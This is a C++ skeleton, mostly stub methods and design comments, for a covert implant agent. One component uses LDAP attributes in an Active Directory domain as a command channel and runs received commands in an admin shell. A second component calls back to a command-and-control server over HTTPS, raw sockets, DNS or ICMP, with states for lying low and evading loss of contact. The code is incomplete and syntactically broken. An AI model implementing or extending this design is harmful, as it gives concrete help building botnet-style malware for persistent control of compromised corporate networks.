

bool debug = true;

enum State { //The current state of the agent
    INIT,                           //starting state, attempt to contact network
    WAIT_FOR_PEERS,                 //wait for configuration information
    SLEEP,                          //communication is not possible, likely box issue. Lie low until connection re-established
    DORMANT,                        //this network is not needed at the moment. Lie low until activated.
    ACTIVE,                         //normal working state
    INTENSIVE,                      //louder or more expensive tasks that can be run less frequently
    PANIC                           //network connection lost, try everything possible to re-establish communication
};

//abstract class representing a network
class networkObject {
protected:
    State state;                    //which state of the state machine is the network in
    virtual void doStep();          //do the actual work for each state.
    static list peers;              //list of active peer nodes (shared between networks)
    static Settings settings;       //object which stores settings for both networks

public:
    int stateCounter;               //how many steps we have been in the current state
    int stepTime;                   //time between network transactions.

    void changeState(State newState, string reason="") {    //update universal variables on state change
        stateCounter = 0;
        state = newState;
        //debug: print state change + reason
    }
    virtual State getState()        //
    { return state; }


    virtual void step(){            //update all the universal variables, then call network specific implementation
        stateCounter++;
        doStep();
    }
};

class MeshNet : networkObject{
protected:
    string doLDAPQuery(string query){
        //error handling
        //error: can't connect to DC -> move to sleep
        //error: credentials -> move to dormant
        //error: attribute not found -> init
    }

    string doCMD(){
        //poll the $computer.CMD attribute in LDAP
        //check the step number in the JSON against a cache of the last 10 executed steps; skip if present
        //for every cmd in the JSON,
        //check if the command begins with 'envoy:' if yes, pass to the envoy command interpreter
        //spawn a thread and execute an OS command
        //as the results come back write them to $computer.result, accounting for race conditions
        //when finished, delete the entry for this step
    }

    string doOS_CMD(String CMD){
        //spawn an admin shell with the command
        //when it finishes return the result
    }

    string doEnvoyCMD(String CMD){
        //big switch statement to handle all the agent commands
    }

    void doStep() {
        switch (state) {
            case INIT:
                // set own LDAP active flag
                // query LDAP for other active users
                // if other users found, send envoy:join
                // if successful move to WAIT_FOR_PEERS
                // if no other users, attempt to configure the LDAP schema then move to WAIT_FOR_PEERS
                // if unable due to permissions, move to dormant
                // if unable due to network, move to sleep
            case WAIT_FOR_PEERS:
                // check command list for an envoy:settings command
                // if received set settings and set peers from envoy:devices (if available) and go to active
                // else continue waiting
                // if waiting for more than 4 loops then move to INIT
                state = ACTIVE;
            case ACTIVE:
                //check for new commands
                //return the value

                //Every x steps in active run the heavy-duty stuff
                if (stateCounter % intensiveCount == 0) {
                    changeState(INTENSIVE);
                    doStep() //run the intensive items immediately
                }
            case INTENSIVE:
                //check up on other members. If they have more than 2 steps of commands in their queue mark them as dead.
                //remove them from peers, remove LDAP active flag and send an envoy:unjoin to all peers on their behalf
                changeState(ACTIVE); // go back to normal load
            case DORMANT:
                // check if LDAP is configured. If it is move to INIT
                // every 10 checks move to INIT
            case SLEEP:
                // check if DC is pingable. If it is move to INIT
                // every 10 checks go to INIT anyways
        }
    }

public:
    string me;                      // Stores the name of the current machine
    string domain;                  // Stores the Domain name
    int intensiveCount;             // How obtain should intensive steps be run
};

class Envoy : networkObject{
protected:
    //linked list storing connection methods
    //connection object storing the active Connection

    bool doC2Callback(String JSONData){
        //attempt to use the active connection
        //send back result data from whole network with the hostname it came from. Include the IP of the envoy
        //write any returned commands to the right host's $computer.CMD
        //if that is null or times out, then call findC2Callback()
    }

    string findC2Callback(bool panic){
        //start from the top of the linked list of conneciton methods and try all of them
        //if one is found then set is as active and return true for success
        //if panic is active then also run the loud callback methods
        //if failed return false
    }

    void doStep() {
        switch (state) {
            case INIT:
                //attempt all preferred methods
                //on success write envoy:settings to self
                //if unavailable due to network, then sleep.
            case ACTIVE:
                //check peers for envoy status, demote to dormant if too many
                //Poll c2 for orders
                //distribute commands
                //update envoy heartbeat
            case PANIC:
                //run a ping with every connection method in envoy, in order of preference
                //if one is successful then move to active with that method
            case DORMANT:
                //check envoy status, if more envoys needed then promote
            case SLEEP:
                //check for network connectivitiy (ping www.msftconnecttest.com)
                //if avalaible move to dormant
                // every 10 checks go to INIT anyway
        }
    }
public:
    State state;

    int targetEnvoyNumber;          //how many envoys to keep promoted at any given time

};

class EnvoyC2Connection {
protected:
    string c2Address;
    Proto proto;
    int rPort;
    int lPort;

public:
    string doC2Callback(String outboundJSONData);
    //constructor makes an object of the right type
};

class EnvoyHTTPSCallback : EnvoyC2Connection {

};

class EnvoyRawSocketCallback : EnvoyC2Connection {

};

class EnvoyDNSCallback : EnvoyC2Connection {

};

class EnvoyICMPCallback : EnvoyC2Connection {

};

int main() {
    bool debug = true;
    if (debug) {std::cout << "Starting Agent" << std::endl;}
    MeshNet mesh = new MeshNet();
    Envoy envoy = new Envoy();

    while(1) {
        int startTime = time(NULL);
        //debug: print state information

        //Main state machines
        mesh.step()
        envoy.step()

        //sleep until the next step
        sleep(mesh.networkStep - time() + startTime);
    }

    if (debug) {std::cout << "Exiting..." << std::endl;}

    return 0;
}
